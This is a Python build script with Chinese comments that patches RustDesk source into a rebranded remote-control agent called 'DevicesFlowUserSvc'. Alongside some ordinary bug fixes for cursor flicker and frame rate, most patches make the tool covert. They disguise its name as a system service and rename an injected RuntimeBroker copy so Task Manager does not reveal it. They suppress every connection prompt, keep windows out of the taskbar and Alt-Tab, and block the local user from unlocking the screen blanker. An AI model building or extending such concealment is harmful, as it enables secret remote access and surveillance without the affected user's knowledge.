#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DevicesFlowUserSvc 受控端 UI 补丁。

用法: python patch_agent_ui.py <rustdesk 源码根目录>

做三件事：
1. main.dart 补 import 并把首页 `? const DesktopTabPage()` 换成 `? const AgentPage()`
   （整个窗口变成 250x148 的 ID + 修改访问密码小窗）；
2. 关掉 runMainApp 里的自动更新检查（agent 版不接受上游更新推送）；
3. main.cpp 窗口标题常量 L"RustDesk" -> L"DevicesFlowUserSvc"
   （上游硬编码，workflow 的 appname sed 不覆盖此文件）。
"""

import os
import re
import sys

BRAND = 'DevicesFlowUserSvc'
IMPORT_LINE = "import 'package:flutter_hbb/desktop/pages/agent_page.dart';"
UNLOCK_WATCHER_MARK = 'hy_local_unlock_watcher'


def patch_main_dart(root):
    main_dart = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(main_dart):
        raise SystemExit('main.dart not found: %s' % main_dart)

    with open(main_dart, encoding='utf-8') as f:
        src = f.read()

    if IMPORT_LINE not in src:
        m = re.search(
            r"^import 'package:flutter_hbb/desktop/pages/desktop_tab_page\.dart';\s*$",
            src, re.M)
        if m:
            src = src[:m.end()] + '\n' + IMPORT_LINE + src[m.end():]
        else:
            idx = src.rfind('\nimport ')
            end = src.find('\n', idx + 1)
            src = src[:end + 1] + IMPORT_LINE + '\n' + src[end + 1:]

    if 'const AgentPage()' not in src:
        n = src.count('? const DesktopTabPage()')
        if n == 0:
            raise SystemExit('patch failed: DesktopTabPage call site not found')
        src = src.replace('? const DesktopTabPage()', '? const AgentPage()')

    # 关闭自动更新检查（runMainApp 内），agent 版只接受 MSI 静默重装升级
    src = src.replace('  checkUpdate();\n',
                      '  // agent build: auto update disabled\n',
                      1)

    with open(main_dart, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.dart (home -> AgentPage, checkUpdate disabled)')


def patch_main_cpp(root):
    main_cpp = os.path.join(root, 'flutter', 'windows', 'runner', 'main.cpp')
    if not os.path.isfile(main_cpp):
        raise SystemExit('main.cpp not found: %s' % main_cpp)

    with open(main_cpp, encoding='utf-8') as f:
        src = f.read()

    old = 'std::wstring app_name = L"RustDesk";'
    if old not in src:
        if 'L"%s"' % BRAND in src:
            print('main.cpp already branded')
            return
        raise SystemExit('patch failed: app_name anchor not found in main.cpp')
    src = src.replace(old, 'std::wstring app_name = L"%s";' % BRAND)

    with open(main_cpp, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched main.cpp window title -> %s' % BRAND)


def patch_broker_exe(root):
    """隐私屏子进程改名：RuntimeBroker_rustdesk.exe -> RuntimeBroker_<brand>.exe。

    隐私屏开启时受控端把 System32\\RuntimeBroker.exe 复制一份并注入遮挡 DLL，
    复制品名带 rustdesk 会在任务管理器穿帮，改成品牌名。
    """
    p = os.path.join(root, 'src', 'privacy_mode', 'win_topmost_window.rs')
    if not os.path.isfile(p):
        raise SystemExit('win_topmost_window.rs not found: %s' % p)

    with open(p, encoding='utf-8') as f:
        src = f.read()

    old = 'RuntimeBroker_rustdesk.exe'
    new = 'RuntimeBroker_%s.exe' % BRAND.lower()
    if old not in src:
        if new in src:
            print('broker exe already renamed')
            return
        raise SystemExit('patch failed: broker exe name anchor not found')
    src = src.replace(old, new)

    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched privacy broker exe -> %s' % new)


def patch_privacy_local_unlock(root):
    """本地解锁已整体禁用（2026-11-10）：隐私屏只能由管理端远程解除。

    1. 遮挡窗口 DLL（privacy_dllmain.cpp）的 Ctrl+P 键盘钩子与
       GetAsyncKeyState 轮询由 HY_ENABLE_LOCAL_UNLOCK=0 编译开关关闭；
    2. 这里不再向 win_topmost_window.rs 注入 flag 文件监听——
       %ProgramData%\\DevicesFlowUserSvc\\privacy_unlock.flag 任何本地
       用户都能手工创建，保留监听等于给「本地解锁」留后门；
    3. 上游 turn_off_privacy 仍由管理端远程调用（关闭隐私模式/断开连接），
       不受影响。
    """
    print('skip privacy local unlock: disabled by design')


def patch_cm_hide(root):
    """受控端连接时不弹任何提示窗口：连接管理器（CM）窗口强制隐藏。

    上游逻辑：CM 进程启动时读 cm 配置 hide_cm == 'true' 才隐藏；但设置界面
    里写这个配置的开关已被上游注释掉，实际永远 false → 每次有人连上来，
    受控端右下角都弹出「连接管理器」窗口（用户报「受控端连接出现提示窗口」）。
    这里在 agent 构建里强制隐藏：
      1. main.dart runConnectionManagerScreen：hide 恒为 true；
      2. server_model.dart：hideCm 字段默认 true（timerCallback / 客户端
         状态更新里所有 showCmWindow 都被 !hideCm 守卫，一并关死）。
    """
    # 1) main.dart
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    if not os.path.isfile(p):
        raise SystemExit('main.dart not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：连接管理器窗口永不显示' not in src:
        anchor = ("  final hide = await bind.cmGetConfig(name: \"hide_cm\")"
                  " == 'true';\n"
                  "  gFFI.serverModel.hideCm = hide;\n")
        if anchor not in src:
            raise SystemExit('patch failed: cm hide anchor not found in main.dart')
        new = ("  // 【HyDesk】agent 隐身：连接管理器窗口永不显示（连接无任何提示）。\n"
               "  // 上游 hide_cm 配置的设置入口已被注释，恒为 false，这里直接强制。\n"
               "  // 注意：绝不能再调 windowManager.setSkipTaskbar —— 它内部走\n"
               "  // ITaskbarList COM（CoCreateInstance），在服务拉起的会话里可能失败，\n"
               "  // 插件不判空就调 vtable，直接 0xc0000005 崩溃（window_manager_plugin.dll），\n"
               "  // 表现就是「连接被对方关闭」+ 客户端每 8 秒重连一次的死循环。\n"
               "  // 窗口只要 hide() 掉就不在任务栏，不需要这个调用。\n"
               "  final hide = true;\n"
               "  gFFI.serverModel.hideCm = hide;\n")
        src = src.replace(anchor, new, 1)
        with open(p, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched main.dart: CM window never shown')
    else:
        print('main.dart CM hide already patched')

    # 2) server_model.dart
    p2 = os.path.join(root, 'flutter', 'lib', 'models', 'server_model.dart')
    if not os.path.isfile(p2):
        print('skip cm hide: server_model.dart not found')
        return
    with open(p2, encoding='utf-8') as f:
        src = f.read()

    if 'agent 隐身：CM 窗口默认隐藏' not in src:
        anchor = '  bool hideCm = false;\n'
        if anchor not in src:
            raise SystemExit('patch failed: hideCm anchor not found')
        src = src.replace(
            anchor,
            '  bool hideCm = true; // 【HyDesk】agent 隐身：CM 窗口默认隐藏\n',
            1)
        with open(p2, 'w', encoding='utf-8', newline='\n') as f:
            f.write(src)
        print('patched server_model.dart: hideCm defaults true')
    else:
        print('server_model.dart hideCm already patched')


def patch_no_skip_taskbar_option(root):
    """Dart 侧不再传 skipTaskbar，彻底断掉 window_manager 的 ITaskbarList COM。

    getHiddenTitleBarWindowOptions() 里写死 skipTaskbar: false，
    waitUntilReadyToShow() 会在**每次**窗口 ready 时调用 setSkipTaskbar(false)。
    插件（rustdesk-org/window_manager）的 SetSkipTaskbar() 是：

        taskbar_->HrInit();
        if (!is_skip_taskbar_) taskbar_->AddTab(hWnd);
        else                   taskbar_->DeleteTab(hWnd);

    taskbar_ 来自 WaitUntilReadyToShow() 里的 CoCreateInstance(CLSID_TaskbarList)，
    返回值没检查、taskbar_ 没判空。服务会话（session 0 / 无 explorer 关联）里
    CoCreateInstance 可能失败 → taskbar_ == nullptr → HrInit() 空指针，
    0xc0000005（window_manager_plugin.dll）→ 进程死 → 客户端「连接被对方关闭」
    并每 8 秒重连一次。

    即便 COM 成功，`AddTab(hWnd)` 是**主动把窗口塞回任务栏**，DeleteTab 又有
    时序问题（窗口重新可见后任务栏按钮会再出现）—— 这就是用户看到的
    「任务栏有时没有、有时又出现，不稳定」。

    任务栏隐藏改由 runner 的 WS_EX_TOOLWINDOW 静态保证（patch_win32_taskbar），
    这里把 skipTaskbar 传成 null，就不再有任何 COM 调用。
    """
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    src = read(p)
    mark = '不传 skipTaskbar'
    if mark in src:
        print('main.dart skipTaskbar option already removed')
        return
    old = '    skipTaskbar: false,\n'
    if old not in src:
        raise SystemExit('patch failed: skipTaskbar option anchor not found')
    new = ('    // 【HyDesk】不传 skipTaskbar：window_manager 拿到它就会调 '
           'ITaskbarList COM，\n'
           '    // 服务会话里 CoCreateInstance 失败后插件不判空，直接空指针崩溃；\n'
           '    // 成功时 AddTab 又会把窗口塞回任务栏（任务栏时有时无的来源）。\n'
           '    // 任务栏隐藏改由 runner 的 WS_EX_TOOLWINDOW 静态保证。\n')
    src = src.replace(old, new, 1)
    write(p, src)
    print('patched main.dart: skipTaskbar option removed (no COM)')


def patch_win32_taskbar(root):
    """窗口创建时就用 WS_EX_TOOLWINDOW，彻底不碰 ITaskbarList COM。

    上游 win32_window.cpp CreateAndShow()：

        HWND window = CreateWindow(...);
        if (!showOnTaskBar) {
          hr = CoCreateInstance(CLSID_TaskbarList, ...);
          if (FAILED(hr)) return false;      // ← 窗口没建成就返回失败
          pTaskbarList->HrInit();
          pTaskbarList->DeleteTab(window);
        }

    showOnTaskBar 在 main.cpp 里是 `!is_cm_page`：--cm 连接管理器窗口传 false，
    也就是说**每次被连接**都走这段 COM。服务会话里 CoCreateInstance 失败时
    CreateAndShow 返回 false → wWinMain 直接 return EXIT_FAILURE → 进程秒退，
    客户端提示「连接被对方关闭」并反复重连；成功时 DeleteTab 也有时序问题
    （窗口稍后被 show 又会拿回任务栏按钮）→ 任务栏时有时无。

    改成 CreateWindowExW(showOnTaskBar ? 0 : WS_EX_TOOLWINDOW, ...) 并删掉整段
    COM：TOOLWINDOW 窗口从创建那一刻起就不进任务栏、不进 Alt-Tab，纯 Win32
    API，无 COM、无时序、无空指针风险。
    """
    p = os.path.join(root, 'flutter', 'windows', 'runner', 'win32_window.cpp')
    if not os.path.isfile(p):
        raise SystemExit('win32_window.cpp not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'WS_EX_TOOLWINDOW' in src:
        print('win32_window.cpp toolwindow already patched')
        return

    old_create = ('  HWND window = CreateWindow(\n'
                  '      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n')
    new_create = ('  // 【HyDesk】用 WS_EX_TOOLWINDOW 隐藏任务栏图标，不再走\n'
                  '  // ITaskbarList COM：COM 在服务会话里可能失败，上游此时直接\n'
                  '  // return false → 进程秒退，客户端表现为「连接被对方关闭」\n'
                  '  // 并反复重连；成功时 DeleteTab 也有时序问题，窗口重新可见会\n'
                  '  // 再拿回任务栏按钮（任务栏时有时无）。\n'
                  '  HWND window = CreateWindowExW(\n'
                  '      showOnTaskBar ? 0L : WS_EX_TOOLWINDOW,\n'
                  '      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n')
    if old_create not in src:
        raise SystemExit('patch failed: CreateWindow anchor not found')
    src = src.replace(old_create, new_create, 1)

    old_com = ('  if (!showOnTaskBar) {\n'
               '    // hide from taskbar\n'
               '    HRESULT hr;\n'
               '    ITaskbarList* pTaskbarList;\n'
               '    hr = CoCreateInstance(CLSID_TaskbarList, NULL, '
               'CLSCTX_INPROC_SERVER,IID_ITaskbarList,(void**)&pTaskbarList);\n'
               '    if (FAILED(hr)) {\n'
               '        return false;\n'
               '    }\n'
               '    hr = pTaskbarList->HrInit();\n'
               '    hr = pTaskbarList->DeleteTab(window);\n'
               '    hr = pTaskbarList->Release();\n'
               '  }\n'
               '\n')
    if old_com in src:
        src = src.replace(old_com, '', 1)
        print('win32_window.cpp: ITaskbarList block removed')
    elif 'ITaskbarList' in src:
        raise SystemExit('patch failed: ITaskbarList block anchor not found')
    else:
        print('win32_window.cpp: ITaskbarList block already absent')

    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched win32_window.cpp -> CreateWindowExW(WS_EX_TOOLWINDOW)')


def patch_cm_hide_no_minimize(root):
    """hideCmWindow 里去掉 minimize()：最小化会把窗口先送进任务栏。

    hideCmWindow() 的顺序是 setOpacity(0) -> waitUntilReadyToShow ->
    minimize() -> hide()。minimize() 那一刻窗口对任务栏来说「可见」了，
    任务栏按钮被创建出来，随后 hide() 才移除 —— 中间这段就是用户看到的
    「连接时任务栏偶尔闪一下」。不稳定的原因：minimize 在窗口尚未真正
    显示时是否生效取决于时序，所以有时闪、有时不闪。

    setOpacity(0) 已经保证窗口全透明不可见，直接 hide() 即可。
    """
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    src = read(p)
    mark = '不调 minimize'
    if mark in src:
        print('main.dart cm hide minimize already removed')
        return

    old1 = ('    windowManager.setOpacity(0);\n'
            '    await windowManager.waitUntilReadyToShow(windowOptions, null);\n'
            '    bind.mainHideDock();\n'
            '    await windowManager.minimize();\n'
            '    await windowManager.hide();\n')
    new1 = ('    windowManager.setOpacity(0);\n'
            '    await windowManager.waitUntilReadyToShow(windowOptions, null);\n'
            '    bind.mainHideDock();\n'
            '    // 【HyDesk】不调 minimize：最小化会先把窗口送进任务栏（按钮闪一下\n'
            '    // 再随 hide 消失），且是否生效依赖时序 —— 这就是「任务栏时有时无」。\n'
            '    // setOpacity(0) 已保证不可见，直接 hide。\n'
            '    await windowManager.hide();\n')
    old2 = ('      await windowManager.setOpacity(0);\n'
            '      bind.mainHideDock();\n'
            '      await windowManager.minimize();\n'
            '      await windowManager.hide();\n')
    new2 = ('      await windowManager.setOpacity(0);\n'
            '      bind.mainHideDock();\n'
            '      // 【HyDesk】同上：不调 minimize，避免任务栏按钮闪现。\n'
            '      await windowManager.hide();\n')

    n = 0
    if old1 in src:
        src = src.replace(old1, new1, 1)
        n += 1
    if old2 in src:
        src = src.replace(old2, new2, 1)
        n += 1
    if n == 0:
        raise SystemExit('patch failed: hideCmWindow minimize anchor not found')
    write(p, src)
    print('patched main.dart: hideCmWindow drops minimize() (%d site)' % n)


def patch_cursor_move_guard(root):
    """受控端光标保护：连接首个 (0,0) 事件丢弃 + 同坐标去重。

    现象一「远程连接后受控端鼠标跳到桌面左上角」：
    客户端刚连上时可能先发一个坐标 (0,0) 的绝对移动事件（坐标尚未初始化），
    受控端 handle_mouse_simulation_ 的 MOUSE_TYPE_MOVE 分支无条件执行
    `en.mouse_move_to(evt.x, evt.y)` → SetCursorPos(0,0) → 光标跳到左上角。

    现象二「Win7/Win10 上鼠标闪烁」：
    每个 MOVE 事件都调一次 SetCursorPos，客户端高频重发同一坐标时，受控端
    光标被反复重新定位/重绘，视觉上就是闪烁（Win7 无 DWM 光标合成优化更明显）。

    处理：每个连接的第一个绝对移动若是 (0,0) 丢弃；同一坐标 500ms 内不重复下发。
    """
    p = os.path.join(root, 'src', 'server', 'input_service.rs')
    if not os.path.isfile(p):
        raise SystemExit('input_service.rs not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'hy_should_move_mouse' in src:
        print('input_service.rs cursor guard already patched')
        return

    anchor = ('            #[cfg(not(target_os = "linux"))]\n'
              '            let (mx, my) = (evt.x, evt.y);\n'
              '            en.mouse_move_to(mx, my);\n')
    if anchor not in src:
        raise SystemExit('patch failed: mouse_move_to anchor not found')
    new = ('            #[cfg(not(target_os = "linux"))]\n'
           '            let (mx, my) = (evt.x, evt.y);\n'
           '            // 【HyDesk】防「连上就跳桌面左上角」+ 防 Win7/Win10 光标闪烁，\n'
           '            // 见 hy_should_move_mouse 注释。\n'
           '            if hy_should_move_mouse(conn, mx, my) {\n'
           '                en.mouse_move_to(mx, my);\n'
           '            }\n')
    src = src.replace(anchor, new, 1)

    helper = ('/// 【HyDesk】受控端光标移动保护。\n'
              '///\n'
              '/// 1) 每个连接的第一个绝对移动事件若为 (0,0)，多半是客户端刚连上、\n'
              '///    坐标还没初始化，直接 SetCursorPos(0,0) 会让受控端鼠标跳到\n'
              '///    桌面左上角 —— 丢弃。\n'
              '/// 2) 同一坐标 500ms 内不重复下发：每个 MOVE 都 SetCursorPos 会让\n'
              '///    Win7/Win10 的光标反复重绘（表现为鼠标闪烁）。\n'
              '#[allow(dead_code)]\n'
              'fn hy_should_move_mouse(conn: i32, x: i32, y: i32) -> bool {\n'
              '    static LAST: std::sync::Mutex<Option<(i32, (i32, i32), Instant)>> =\n'
              '        std::sync::Mutex::new(None);\n'
              '    let now = Instant::now();\n'
              '    let mut last = LAST.lock().unwrap();\n'
              '    let new_session = match *last {\n'
              '        Some((lc, _, _)) => lc != conn,\n'
              '        None => true,\n'
              '    };\n'
              '    if new_session && x == 0 && y == 0 {\n'
              '        *last = Some((conn, (x, y), now));\n'
              '        return false;\n'
              '    }\n'
              '    if let Some((lc, (lx, ly), t)) = *last {\n'
              '        if lc == conn\n'
              '            && lx == x\n'
              '            && ly == y\n'
              '            && t.elapsed() < Duration::from_millis(500)\n'
              '        {\n'
              '            return false;\n'
              '        }\n'
              '    }\n'
              '    *last = Some((conn, (x, y), now));\n'
              '    true\n'
              '}\n'
              '\n'
              'pub fn handle_mouse_simulation_(evt: &MouseEvent, conn: i32) {\n')
    helper_anchor = 'pub fn handle_mouse_simulation_(evt: &MouseEvent, conn: i32) {\n'
    if helper_anchor not in src:
        raise SystemExit('patch failed: handle_mouse_simulation_ anchor not found')
    src = src.replace(helper_anchor, helper, 1)

    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched input_service.rs: cursor move guard (drop leading 0,0 + dedup)')


def patch_gdi_capture_no_cursor(root):
    """GDI 抓屏去掉 CAPTUREBLT —— 上游注释自己写了「also make cursor blinking」。

    Win7 没有 DXGI Desktop Duplication，受控端只能走 libs/scrap/src/dxgi/gdi.rs 的
    BitBlt 路径；Win10 在不支持 DDA 的机器/会话里也会回退到这条路径。
    BitBlt 带 CAPTUREBLT 会把光标一并画进捕获的图像，画面里于是多出一个随帧率
    刷新的光标，与真实光标叠加 —— 用户看到的就是「鼠标闪烁 / 拖影」。

    去掉 CAPTUREBLT 后 BitBlt 不再捕获光标（也不再捕获分层窗口，属于可接受的
    代价：这类窗口在 DXGI 路径下本来显示正常）。
    """
    p = os.path.join(root, 'libs', 'scrap', 'src', 'dxgi', 'gdi.rs')
    if not os.path.isfile(p):
        raise SystemExit('gdi.rs not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if '【HyDesk】不用 CAPTUREBLT' in src:
        print('gdi.rs CAPTUREBLT already removed')
        return

    old = ('                SRCCOPY | CAPTUREBLT, // CAPTUREBLT enable layered window '
           'but also make cursor blinking\n')
    if old not in src:
        raise SystemExit('patch failed: BitBlt CAPTUREBLT anchor not found')
    new = ('                // 【HyDesk】不用 CAPTUREBLT：它会把光标一起抓进画面，\n'
           '                // 与真实光标叠加后表现为「鼠标闪烁 / 拖影」（上游注释也写明\n'
           '                // "also make cursor blinking"）。Win7 没有 DDA，必现。\n'
           '                SRCCOPY,\n')
    src = src.replace(old, new, 1)
    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched gdi.rs: BitBlt drops CAPTUREBLT (no cursor in capture)')


def read(p):
    with open(p, encoding='utf-8-sig') as f:
        return f.read()


def write(p, src):
    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)


def patch_agent_window_first_show(root):
    """agent 主窗口：安装/首次运行弹一次 ID 面板，其余一律隐藏且永不进任务栏。

    2026-11-10 19:15 用户报「受控端被连接后任务栏有提示」：
    上一版首启判断读 %LOCALAPPDATA%\\.ui_shown，但服务在用户会话拉起
    agent 进程时环境可能继承 SYSTEM/异账户的 LOCALAPPDATA，标记文件
    找不到 → 误判首次 → 窗口在任务栏冒出来（被连接/开机都可能出现）。

    2026-11-11 用户报「第一次安装还是无法显示软件界面」：只认安装器写的
    %ProgramData%\\.hy_show_id，一旦安装器那一步没跑到（用 MSI 直接装、
    安装器被安全软件拦、旧版安装包），就永远看不到 ID 面板。现在三个入口
    任意命中即弹：

      1. --hy-show-id 命令行参数（agent_setup.nsi 装完带参数拉起，最可靠）；
      2. %ProgramData%\\<Product>\\.hy_show_id 标记（30 分钟内有效，读到即删）；
      3. 本机首次运行（%ProgramData%\\<Product>\\.hy_ui_seen 不存在）——
         兜底覆盖「MSI 静默装 / 旧安装包 / 手工双击 exe」三种场景，弹过
         就落 .hy_ui_seen，之后开机自启、服务拉起、被连接都纯后台隐藏。

    弹窗时居中 + 临时置顶 20 秒（避免被浏览器/安装器窗口盖住看不到）。
    这里不要调 windowManager.setSkipTaskbar：该接口走 ITaskbarList COM，
    插件不判空，CoCreateInstance 失败时空指针崩溃（见 patch_cm_hide 注释）。
    """
    p = os.path.join(root, 'flutter', 'lib', 'main.dart')
    src = read(p)
    mark = 'agent 首启：安装器标记/首次运行触发'
    if mark in src:
        print('main.dart agent window installer-marker already patched')
        return
    old = ('      windowManager.show();\n'
           '      windowManager.focus();\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    if old not in src:
        raise SystemExit('patch failed: runMainApp show anchor not found')
    new = ('      // 【HyDesk】' + mark + '\n'
           '      // 触发条件：--hy-show-id 参数 / 安装器 ProgramData 标记（30 分钟）/ 本机首次运行。\n'
           '      // 其余情况（服务拉起、开机、被连接）一律静默。\n'
           '      // 不调 setSkipTaskbar：窗口不 show 就天然不在任务栏，\n'
           '      // 而该接口在服务会话里会因 ITaskbarList COM 失败而崩溃。\n'
           '      var hyShowOnce = false;\n'
           '      String hyBase = \'C:\\\\ProgramData\';\n'
           '      try {\n'
           '        hyBase = Platform.environment[\'ProgramData\'] ??\n'
           '            Platform.environment[\'LOCALAPPDATA\'] ??\n'
           '            \'C:\\\\ProgramData\';\n'
           '        final hyDir = Directory(\'$hyBase\\\\DevicesFlowUserSvc\');\n'
           '        final hyFlag = File(\'${hyDir.path}\\\\.hy_show_id\');\n'
           '        final hySeen = File(\'${hyDir.path}\\\\.hy_ui_seen\');\n'
           '        // 1) 命令行显式要求（安装器）\n'
           '        if (kBootArgs.contains(\'--hy-show-id\')) {\n'
           '          hyShowOnce = true;\n'
           '        }\n'
           '        // 2) 安装器写的限时标记\n'
           '        if (!hyShowOnce && hyFlag.existsSync()) {\n'
           '          hyShowOnce = DateTime.now()\n'
           '                  .difference(hyFlag.lastModifiedSync())\n'
           '                  .inMinutes <\n'
           '              30;\n'
           '        }\n'
           '        // 3) 本机首次运行兜底\n'
           '        if (!hyShowOnce && !hySeen.existsSync()) {\n'
           '          hyShowOnce = true;\n'
           '        }\n'
           '        if (hyShowOnce) {\n'
           '          try {\n'
           '            hyDir.createSync(recursive: true);\n'
           '            if (hyFlag.existsSync()) hyFlag.deleteSync();\n'
           '            hySeen.writeAsStringSync(\'1\');\n'
           '          } catch (_) {}\n'
           '        }\n'
           '      } catch (_) {}\n'
           '      if (hyShowOnce) {\n'
           '        windowManager.show();\n'
           '        windowManager.focus();\n'
           '        // 居中 + 临时置顶，防止被浏览器/安装器窗口盖住而「看不到界面」\n'
           '        windowManager.setAlignment(Alignment.center);\n'
           '        windowManager.setAlwaysOnTop(true);\n'
           '        Future.delayed(const Duration(seconds: 20), () {\n'
           '          try {\n'
           '            windowManager.setAlwaysOnTop(false);\n'
           '          } catch (_) {}\n'
           '        });\n'
           '      } else {\n'
           '        windowManager.hide();\n'
           '      }\n'
           '      // Move registration of active main window here to prevent'
           ' from async visible check.\n')
    src = src.replace(old, new, 1)
    # 兜底：标记文件依赖 dart:io 的 File/Platform/Directory
    if ("import 'dart:io';" not in src
            and 'import "dart:io";' not in src):
        imp = "import 'package:flutter/material.dart';"
        if imp in src:
            src = src.replace(imp, "import 'dart:io';\n\n" + imp, 1)
            print('main.dart: added dart:io import for install marker')
    write(p, src)
    print('patched main.dart: agent window shows on install/first run only')


def patch_video_qos_fps(root):
    """受控端 QoS：连接建立瞬间起始帧率 15 -> 25（v1.5.46）。

    上游 video_qos.rs INIT_FPS=15，刚连上看视频流起步只有 15 帧，网络好
    也要靠 TestDelay 若干轮加倍才追上去，首屏观感明显卡顿。起步 25 帧
    让连接初期即流畅；拥塞自适应逻辑不动，网络差照样按原规则降帧，
    下限 MIN_AUTO_FPS=5 不变。
    """
    p = os.path.join(root, 'src', 'server', 'video_qos.rs')
    if not os.path.isfile(p):
        raise SystemExit('video_qos.rs not found: %s' % p)
    with open(p, encoding='utf-8') as f:
        src = f.read()

    if 'INIT_FPS: u32 = 25' in src:
        print('video_qos.rs INIT_FPS already 25')
        return

    old = 'pub const INIT_FPS: u32 = 15;'
    if old not in src:
        raise SystemExit('patch failed: INIT_FPS anchor not found')
    src = src.replace(old, 'pub const INIT_FPS: u32 = 25;', 1)
    with open(p, 'w', encoding='utf-8', newline='\n') as f:
        f.write(src)
    print('patched video_qos.rs: INIT_FPS 15 -> 25')


def main():
    root = sys.argv[1] if len(sys.argv) > 1 else '.'
    if not os.path.isfile(os.path.join(root, 'flutter', 'lib', 'main.dart')):
        page = os.path.join(root, 'flutter', 'lib', 'desktop', 'pages',
                            'agent_page.dart')
        if not os.path.isfile(page):
            raise SystemExit('agent_page.dart not found: %s' % page)
    patch_main_dart(root)
    patch_main_cpp(root)
    patch_broker_exe(root)
    patch_privacy_local_unlock(root)
    patch_cm_hide(root)
    patch_agent_window_first_show(root)
    # 任务栏：Dart 断 COM + runner 静态 TOOLWINDOW + 去掉 minimize 闪窗（v1.5.42）
    patch_no_skip_taskbar_option(root)
    patch_win32_taskbar(root)
    patch_cm_hide_no_minimize(root)
    # 光标：连上跳左上角 + Win7/Win10 闪烁（v1.5.42）
    patch_cursor_move_guard(root)
    patch_gdi_capture_no_cursor(root)
    # 画质/延迟：受控端起始帧率 15 -> 25（v1.5.46）
    patch_video_qos_fps(root)


if __name__ == '__main__':
    main()
